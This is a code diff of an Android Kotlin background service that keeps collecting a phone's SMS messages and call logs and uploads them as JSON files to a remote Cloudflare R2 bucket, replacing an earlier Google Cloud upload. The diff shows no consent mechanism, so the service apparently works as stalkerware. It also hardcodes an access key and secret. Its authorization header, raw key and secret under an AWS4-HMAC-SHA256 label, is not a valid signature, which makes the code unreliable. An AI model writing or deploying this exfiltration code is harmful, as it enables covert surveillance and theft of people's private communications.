@@ -13,26 +13,28 @@ import android.os.IBinder
 import android.provider.CallLog
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import com.google.auth.oauth2.GoogleCredentials
-import com.google.cloud.storage.BlobId
-import com.google.cloud.storage.BlobInfo
-import com.google.cloud.storage.Storage
-import com.google.cloud.storage.StorageOptions
 import kotlinx.coroutines.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.Response
 import org.json.JSONArray
 import org.json.JSONObject
-import java.io.ByteArrayInputStream
-import java.io.FileInputStream
+import java.io.File
+import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.*
-import java.io.InputStream
-
 class MessageAndCallService : Service() {
 
     private val handler = Handler()
-    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
-    private lateinit var storageClient: Storage
-    private val bucketName = "msg_call_10101"
+    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val bucketName = "msg-call-10101"
+    private val r2EndpointUrl = "https://76a2ea550634a917ef163968dc2278d6.r2.cloudflarestorage.com"
+    private val accessKey = "17ae806db76be3fbc5d848528d7ade0f"
+    private val secretKey = "afda45a100ecd59fd86d8a184c28d3c4f2e40438becfe86eaf716b81eac450b0"
+
+    private val client = OkHttpClient()
 
     private val runnable = object : Runnable {
         override fun run() {
@@ -43,7 +45,6 @@ class MessageAndCallService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        setupGoogleCloudClient()
         handler.post(runnable)
         startForegroundNotification()
     }
@@ -60,31 +61,12 @@ class MessageAndCallService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(runnable)
-        scope.cancel()  // Cancel all coroutines when service is destroyed
+        scope.cancel()
         Log.d(TAG, "Service Destroyed")
     }
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
-    }
-
-    private fun setupGoogleCloudClient() {
-        try {
-            // Open the credentials.json file from the assets folder
-            val credentialsStream: InputStream = this.assets.open("credentials.json")  // 'this' refers to the Service context
-            // Load Google credentials from the input stream
-            val credentials = GoogleCredentials.fromStream(credentialsStream)
-
-            // Initialize Google Cloud Storage client with the credentials
-            storageClient = StorageOptions.newBuilder()
-                .setCredentials(credentials)
-                .build()
-                .service
-
-            Log.d(TAG, "Google Cloud client initialized successfully")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error loading Google Cloud credentials", e)
-        }
     }
 
     private fun collectMessagesAndCalls() {
@@ -116,11 +98,8 @@ class MessageAndCallService : Service() {
             }
         }
 
-        // Upload data to Google Cloud Storage in a coroutine
-        scope.launch {
-            val formattedData = formatDataForUpload(messages)
-            uploadDataToGoogleCloud("messages.json", formattedData)
-        }
+        val formattedData = formatDataForUpload(messages)
+        writeToFileAndUpload("messages.json", formattedData)
     }
 
     private fun collectCallLogs() {
@@ -148,11 +127,8 @@ class MessageAndCallService : Service() {
             }
         }
 
-        // Upload data to Google Cloud Storage in a coroutine
-        scope.launch {
-            val formattedData = formatDataForUpload(calls)
-            uploadDataToGoogleCloud("calls.json", formattedData)
-        }
+        val formattedData = formatDataForUpload(calls)
+        writeToFileAndUpload("calls.json", formattedData)
     }
 
     private fun formatDataForUpload(contents: JSONArray): String {
@@ -163,17 +139,37 @@ class MessageAndCallService : Service() {
         }.toString()
     }
 
-    private suspend fun uploadDataToGoogleCloud(fileName: String, data: String) {
+    private fun writeToFileAndUpload(fileName: String, data: String) {
+        val file = File(filesDir, fileName)
+        FileOutputStream(file).use {
+            it.write(data.toByteArray())
+        }
+
+        // Launch coroutine for file upload
+        scope.launch {
+            uploadToCloudflareR2(file, fileName)
+        }
+    }
+
+    private suspend fun uploadToCloudflareR2(file: File, fileName: String) {
         withContext(Dispatchers.IO) {
             try {
-                val blobId = BlobId.of(bucketName, fileName)
-                val blobInfo = BlobInfo.newBuilder(blobId).setContentType("application/json").build()
-                val inputStream = ByteArrayInputStream(data.toByteArray())
+                val requestBody = file.asRequestBody("application/json".toMediaTypeOrNull())
+                val request = Request.Builder()
+                    .url("$r2EndpointUrl/$bucketName/$fileName")
+                    .put(requestBody)
+                    .header("Authorization", "AWS4-HMAC-SHA256 $accessKey:$secretKey")
+                    .build()
 
-                storageClient.create(blobInfo, inputStream)
-                Log.d(TAG, "$fileName uploaded to Google Cloud Storage")
+                client.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "$fileName uploaded successfully to Cloudflare R2")
+                    } else {
+                        Log.e(TAG, "Failed to upload $fileName: ${response.message}")
+                    }
+                }
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to upload $fileName to Google Cloud Storage", e)
+                Log.e(TAG, "Error uploading $fileName to Cloudflare R2", e)
             }
         }
     }
